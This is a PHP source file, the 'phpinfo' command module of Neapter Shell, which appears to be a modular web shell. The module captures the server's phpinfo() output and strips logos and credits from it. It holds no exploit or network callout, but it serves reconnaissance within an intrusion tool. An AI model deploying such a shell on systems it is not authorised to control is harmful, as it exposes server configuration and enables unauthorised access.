<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Wyswietlanie PHPinfo
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModulePhpinfo extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('phpinfo');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2011-11-20 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Informacje o PHP

	Użycie:
		phpinfo
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        ob_start();
        phpinfo();
        $sData = ob_get_contents();
        ob_clean();
        ob_end_flush();

        /**
         * Wywalanie zbednych tresci, klasy itp
         * Licencje kazdy zna
         */
        if (PHP_SAPI !== 'cli') {
            $sData = str_replace(array
            (
                ' class="e"',
                ' class="v"'
            ),
                '',
                substr($sData,
                    strpos($sData, '<div class="center">') + 20,
                    -(strlen($sData) - strrpos($sData, '<h2>PHP License</h2>'))
                )
            );
        }

        /**
         * logo kazdy widzial, creditsy tez
         */
        $sData = preg_replace('~<a href="http://www.php.net/"><img border="0" src="[^"]+" alt="PHP Logo" /></a><h1 class="p">(.+?)</h1>~', '<h1>$1</h1>', $sData);
        $sData = preg_replace('~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData);
        $sData = preg_replace('~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData);

        return $sData;
    }

}
